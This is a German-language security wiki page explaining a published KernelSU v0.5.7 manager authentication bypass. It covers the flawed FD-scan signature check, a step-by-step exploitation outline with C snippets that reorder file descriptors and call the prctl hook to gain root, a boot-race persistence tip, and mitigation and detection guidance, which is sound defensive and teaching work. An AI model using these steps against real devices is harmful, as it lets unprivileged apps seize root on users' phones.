# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting Frameworks wie KernelSU, APatch und SKRoot patchen oder hooken den Android/Linux-Kernel und stellen einem unprivilegierten Userspace-Manager-App privilegierte Funktionen zur Verfügung. Magisk wird weiter unten separat behandelt, da CVE-2024-48336 das Laden von Code auf der Manager-Seite und nicht diesen KernelSU-Syscall-Pfad betraf.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Diese Seite abstrahiert die in öffentlicher Forschung aufgedeckten Techniken und Fallstricke (insbesondere die Analyse von KernelSU v0.5.7 durch Zimperium), um sowohl Red- als auch Blue-Teams dabei zu unterstützen, Angriffsflächen, Exploitation Primitives und robuste Mitigations zu verstehen.<sup>[[1]](#references)</sup>

---
## Architekturpattern: syscall-hooked manager channel

- In KernelSU v0.5.7 empfängt ein Kernel-Hook auf `prctl` einen Magic Value, eine Command-ID und commandspezifische Argumente aus dem Userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Der Aufrufer fordert zunächst den Manager-Status mit `CMD_BECOME_MANAGER` an. Die Autorisierung ist command-spezifisch: `CMD_GRANT_ROOT` prüft den Manager-/Allowlist-Status, `CMD_ALLOW_SU` ist nur für den Manager verfügbar, und `CMD_SET_SEPOLICY` ist in dieser Version nur für root verfügbar.<sup>[[2]](#references)[[11]](#references)</sup>
- Andere Commands fragen die Version/Konfiguration ab oder melden Framework-Events.<sup>[[2]](#references)</sup>
- Da jede App diese Syscall-Schnittstelle aufrufen kann, ist die Korrektheit der Manager-Authentifizierung entscheidend.<sup>[[1]](#references)[[2]](#references)</sup>

Beispiel (KernelSU-Design):
- Gehookter Syscall: prctl
- Magic Value zur Umleitung an den KernelSU-Handler: 0xDEADBEEF
- Commands umfassen: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT usw.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (wie implementiert)

Wenn der Userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` aufruft, führt KernelSU folgende Prüfungen durch:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Pfadpräfixprüfung
- Der angegebene Pfad muss mit einem erwarteten Präfix für die aufrufende UID beginnen, z. B. /data/data/<pkg> oder /data/user/<id>/<pkg>.
- Referenz: Pfadpräfixlogik in core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Besitzprüfung
- Der Pfad muss der aufrufenden UID gehören.
- Referenz: Besitzlogik in core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) APK-Signaturprüfung über FD-Table-Scan
- Die offenen File Descriptors des aufrufenden Prozesses werden in aufsteigender Descriptor-Reihenfolge durchlaufen.
- Für jede reguläre Datei, deren Pfad mit `/data/app/` beginnt und mit `/base.apk` endet, muss der Pfad den aus dem angegebenen Datenverzeichnispfad abgeleiteten Package-Substring enthalten.
- Die Signatur des ersten Candidates, der diese Pfadprüfungen besteht, wird verifiziert.
- Die APK-v2-Signatur wird geparst und gegen das offizielle Manager-Zertifikat verifiziert.
- Referenzen: manager.c (Iteration über FDs), apk_sign.c (APK-v2-Verifizierung).<sup>[[3]](#references)[[4]](#references)</sup>

Wenn alle Prüfungen erfolgreich sind, cached der Kernel die UID des Managers vorübergehend; Manager-only-Commands akzeptieren anschließend diese UID, während andere Commands weiterhin ihre eigene UID oder Allowlist-Prüfungen verwenden.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 bindet das Signaturergebnis nicht an die von PackageManager installierte Package-Identität. In `manager.c` ist der Package-Test lediglich eine Pfad-Substring-Prüfung (`strstr(cwd, pkg)`); anschließend wird der erste Candidate, der diesen Test besteht, einer Signaturprüfung unterzogen. Ein Angreifer kann daher eine genuine Manager-APK unter einem `/data/app/`-Pfad ablegen, der ebenfalls den Package-Namen des Angreifers enthält, und dafür sorgen, dass sie zuerst ausgewählt wird.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Dieses Trust-by-Indirection ermöglicht es einer unprivilegierten App, den Manager zu impersonifizieren, ohne den Signing Key des Managers zu besitzen.<sup>[[1]](#references)</sup>

Ausgenutzte Schlüsseleigenschaften:<sup>[[1]](#references)[[3]](#references)</sup>
- Der FD-Scan ist nach Descriptor-Index geordnet, und die Package-Prüfung ist ein Pfad-Substring-Test, keine verifizierte Package-to-APK-Identity-Bindung.
- `open()` gibt den niedrigsten verfügbaren FD zurück. Durch das vorherige Schließen niedrigerer FDs kann ein Angreifer die Reihenfolge kontrollieren.
- Eine gebündelte Manager-APK kann unter `/data/app/` in einem Pfad abgelegt werden, der den Package-String des Angreifers enthält, während die offizielle Manager-Signatur erhalten bleibt.

---
## Angriffsvoraussetzungen

Der konkrete KernelSU-v0.5.7-Fall erfordert:<sup>[[1]](#references)[[3]](#references)</sup>

- Das Gerät ist bereits mit einem verwundbaren Rooting Framework gerootet (z. B. KernelSU v0.5.7).
- Der Angreifer kann lokal beliebigen unprivilegierten Code ausführen (Android-App-Prozess).
- Für die v0.5.7-Implementierung muss `current->real_parent` die UID 0 besitzen (der Source-Kommentar beschreibt dies als Anforderung eines direkten Zygote-Kinds); `manager.c` weist andere Parent-Prozesse zurück.<sup>[[3]](#references)</sup>
- Der echte Manager wurde noch nicht authentifiziert (z. B. direkt nach einem Reboot). Einige Frameworks cachen die Manager-UID nach erfolgreicher Authentifizierung; der Angreifer muss das Race gewinnen.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

Schritte auf hoher Ebene (das Demo-Video zeigt den öffentlich verfügbaren Proof of Concept im Betrieb):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Erstelle einen gültigen Pfad zu deinem eigenen App-Datenverzeichnis, um die Präfix- und Besitzprüfungen zu erfüllen.
2) Lege eine genuine KernelSU-Manager-base.apk unter `/data/app/` in einem Pfad ab, der deinen Package-String enthält, und öffne sie auf einem FD mit niedrigerer Nummer als deine eigene base.apk.
3) Rufe `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` auf, um die Prüfungen zu bestehen.
4) Verwende `CMD_GRANT_ROOT` und anschließend `CMD_ALLOW_SU` für persistentes su; rufe den root-only-Command `CMD_SET_SEPOLICY` erst nach dem Erlangen von root und nur dort auf, wo er unterstützt wird.

Praktische Hinweise zu Schritt 2 (FD-Reihenfolge):<sup>[[1]](#references)</sup>
- Ermittle den FD deines Prozesses für deine eigene `/data/app/*/base.apk`, indem du die Symlinks in `/proc/self/fd` durchläufst.
- Schließe einen niedrigen FD (z. B. stdin, fd 0) und öffne zuerst die legitime Manager-APK, sodass sie fd 0 (oder einen beliebigen Index unterhalb des FDs deiner eigenen base.apk) belegt.
- Bündele die legitime Manager-APK mit deiner App, sodass ihr Pfad mit `/data/app/` beginnt, mit `/base.apk` endet und deinen Package-String enthält. Beispielsweise kann ein Pfad unterhalb des `lib`-Verzeichnisses deiner App diese Prüfungen erfüllen.<sup>[[1]](#references)[[3]](#references)</sup>

Beispiel-Code-Snippets (Android/Linux, nur zur Veranschaulichung):

Offene FDs aufzählen, um base.apk-Einträge zu finden:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Erzwinge, dass ein FD mit einer niedrigeren Nummer auf die legitime Manager-APK zeigt:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Manager-Authentifizierung über den KernelSU-v0.5.7-`prctl`-Hook:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Nach erfolgreichem Abschluss, privilegierte Befehle (Beispiele):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: aktuellen Prozess zu root hochstufen
- CMD_ALLOW_SU: dein Package/deine UID zur Allowlist für persistentes su hinzufügen
- CMD_SET_SEPOLICY: SELinux-Richtlinie nach Erhalt von root anpassen; KernelSU v0.5.7 prüft für diesen Befehl auf UID 0.<sup>[[2]](#references)</sup>

Race-/Persistence-Tipp:
- Einen BOOT_COMPLETED-Receiver im AndroidManifest (`RECEIVE_BOOT_COMPLETED`) registrieren, um nach einem Reboot zu starten und die Authentifizierung vor dem echten Manager zu versuchen; die Permission autorisiert den Empfang von `ACTION_BOOT_COMPLETED`, garantiert jedoch selbst keine Scheduling-Priorität.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Hinweise zu Detection und Mitigation

Für Framework-Entwickler:
- Die Authentifizierung an das Package/die UID des Callers binden, nicht an beliebige FDs:
- Das Package des Callers anhand seiner UID auflösen und gegen die Signatur des installierten Packages verifizieren (über PackageManager), anstatt FDs zu durchsuchen.
- Falls nur im Kernel, eine stabile Caller-Identität (Task-Credentials) verwenden und anhand einer stabilen, von init/Userspace-Helper verwalteten Quelle der Wahrheit validieren, nicht anhand von Prozess-FDs.
- Pfadpräfix-Prüfungen nicht als Identität verwenden; sie können vom Caller trivial erfüllt werden.
- Eine Nonce-basierte Challenge-Response über den Channel verwenden und jede gecachte Manager-Identität beim Boot oder bei wichtigen Events löschen.
- Wenn möglich, authentifizierte Binder-basierte IPC in Betracht ziehen, statt generische Syscalls zu überladen.

Für Defender/Blue Team:
- Das Vorhandensein von Rooting-Frameworks und Manager-Prozessen erkennen; auf prctl-Aufrufe mit verdächtigen Magic Constants (z. B. 0xDEADBEEF) überwachen, falls Kernel-Telemetrie verfügbar ist.<sup>[[1]](#references)[[11]](#references)</sup>
- In verwalteten Geräteflotten Boot-Receiver aus nicht vertrauenswürdigen Packages blockieren oder melden, die nach dem Boot schnell privilegierte Manager-Befehle versuchen.
- Sicherstellen, dass die Geräte auf aktualisierte, gepatchte Framework-Versionen aktualisiert werden; gecachte Manager-IDs beim Update ungültig machen.

Einschränkungen des Angriffs:<sup>[[1]](#references)[[2]](#references)</sup>
- Betrifft nur Geräte, die bereits mit einem verwundbaren Framework gerootet wurden.
- Erfordert typischerweise einen Reboot/ein Race-Fenster, bevor der legitime Manager authentifiziert wird (einige Frameworks cachen die Manager-UID bis zum Reset).

---
## Verwandte Hinweise zu verschiedenen Frameworks

- Password-basierte Authentifizierung (z. B. historische APatch-/SKRoot-Builds) kann schwach sein, wenn Passwörter erratbar oder per Brute-Force angreifbar sind oder die Validierungen fehlerhaft funktionieren.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package-/signaturbasierte Authentifizierung (z. B. KernelSU) ist grundsätzlich stärker, muss jedoch an den tatsächlichen Caller gebunden werden und nicht an aus Pfaden abgeleitete Artefakte, die durch FD-Scans ausgewählt werden.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 betraf Pre-Canary-27007-Builds, die Code aus einem nicht verifizierten GMS-Package luden. Dadurch konnte eine lokale App Code innerhalb der Magisk-App ausführen und ohne Benutzerinteraktion zu root eskalieren.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Das Rooting des Bösen: Sicherheitslücken, die dein Mobilgerät kompromittieren könnten](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c-Authentifizierungsprüfungen](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c-FD-Iteration, Package-Prüfung und Signaturaufruf](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c-APK-v2-Verifizierung](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU-Projekt](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk-Issue #8279 – Überprüfen, ob GMS eine System-App ist](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU-PoC-Demovideo (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h-Befehlsbezeichner](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
